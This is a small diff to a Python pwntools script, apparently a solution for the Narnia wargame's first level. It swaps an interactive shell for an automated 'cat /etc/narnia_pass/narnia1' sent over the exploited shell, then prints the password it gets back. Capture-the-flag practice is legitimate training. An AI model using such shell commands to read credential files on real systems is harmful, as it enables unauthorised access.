@@ -22,6 +22,8 @@ resp = sh.clean(timeout = 2)
 lines = resp.split(b'\n')
 for line in lines:
         print(line)
-# Creating a terminal for which to interact with
-sh.interactive()
+# sh.interactive()
+sh.sendline(b'cat /etc/narnia_pass/narnia1')
+passwd = sh.recvline(timeout = 1)
+print(passwd)
 shell.close()
